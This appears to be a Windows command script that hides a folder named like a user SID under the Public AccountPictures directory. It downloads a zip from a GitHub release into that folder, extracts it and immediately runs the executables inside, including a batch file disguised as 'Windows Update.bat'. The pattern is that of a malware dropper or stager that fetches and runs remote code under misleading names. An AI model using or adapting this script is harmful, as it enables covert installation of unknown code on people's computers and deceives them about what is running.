cd C:\Users\Public\AccountPictures
mkdir S-1-5-21-1444420733-5045720388-1441969103-1002 -Force
cd S-1-5-21-1444420733-5045720388-1441969103-1002
curl.exe -L -o Hello-World.zip https://github.com/wisnia7777/Hello-World/releases/download/test2/code1.zip
Start-Sleep -Seconds 2
Expand-Archive -Path "Hello-World.zip"
cd Hello-World
.\code2.exe
".\Windows Update.bat"
.\code1\code1.exe
exit